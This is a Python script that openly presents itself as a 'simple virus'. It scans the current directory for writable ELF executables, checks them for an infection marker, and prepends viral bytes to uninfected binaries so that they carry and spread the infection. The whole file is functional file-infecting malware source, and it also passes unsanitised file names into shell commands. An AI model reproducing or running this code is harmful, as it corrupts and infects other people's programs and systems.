#!/usr/bin/env python3

import os, sys, re

PATH = os.getcwd()
ELF = "ELF"
OG_FILE = "virus"
INFECT = "simple virus!"
TARGET_EXEC = "/tmp/.target"
INFECTED_RECORD = "/tmp/.infected.txt"
BAD_FILE = "/tmp/.badviruscontents"

def checkWritable(files):
    if os.access(files, os.W_OK):
        return 1
    return 0

def checkElf(header):
    head = header.decode('utf-8')
    if (re.search(ELF, head)):
        return True
    return False

def ogFile(files):
    if(files == OG_FILE):
        return 1
    return 0

def checkInfection(files):
    cmd = "strings " + str(files) + ' | grep "' + INFECT + '"' + " > " + INFECTED_RECORD
    os.system(cmd)
    with open(INFECTED_RECORD, 'r') as infected:
        lines = [line.rstrip() for line in infected]
        if(re.search(INFECT, str(lines))):
            return 1
        return 0

def extractBadContents(files):
    cmd = "head -c 17344 " + files + " > " + BAD_FILE
    os.system(cmd)
    return 1

def manDown(files):
    cmd = "cat " + PATH + "/" + OG_FILE + " " + PATH + "/" + files + " > " + TARGET_EXEC
    output = os.system(cmd)
    cmd = "mv " + TARGET_EXEC + " ./" + files
    os.system(cmd)
    cmd = "chmod u+x " + files
    os.system(cmd)
    cmd = "rm -f " + INFECTED_RECORD
    os.system(cmd)
    return 1

def anotherOne(files):
    cmd = "cat " + BAD_FILE + " " + PATH + "/" + files + " > " + TARGET_EXEC
    os.system(cmd)
    cmd = "mv " + TARGET_EXEC + " ./" + files
    os.system(cmd)
    cmd = "chmod u+x " + files
    os.system(cmd)
    cmd = "rm -f " + BAD_FILE + " " + INFECTED_RECORD
    os.system(cmd)
    return 1

def loadFiles():
    for files in os.listdir(PATH):
        path = os.path.join(PATH, files)
        if os.path.isdir(path):
            continue
        selfCheck = ogFile(files)
        if selfCheck:
            with open(files, 'rb') as f:
                header = f.read(5)
                elf = checkElf(header)
                if elf:
                    writable = checkWritable(files)
                    if writable:
                        infected = checkInfection(files)
                        if infected:
                            extractBadContents(files)
                            continue
                        else:
                            payload = manDown(files)
                            if payload:
                                sys.exit()
        else:
            with open(files, 'rb') as f:
                header = f.read(5)
                elf = checkElf(header)
                if elf:
                    writable = checkWritable(files)
                    if writable:
                        infected = checkInfection(files)
                        if infected:
                            extractBadContents(files)
                            continue
                        else:
                            payload = anotherOne(files)
                            if payload:
                                sys.exit()
    cmd = "rm -f " + BAD_FILE + " " + INFECTED_RECORD
    os.system(cmd)

loadFiles()
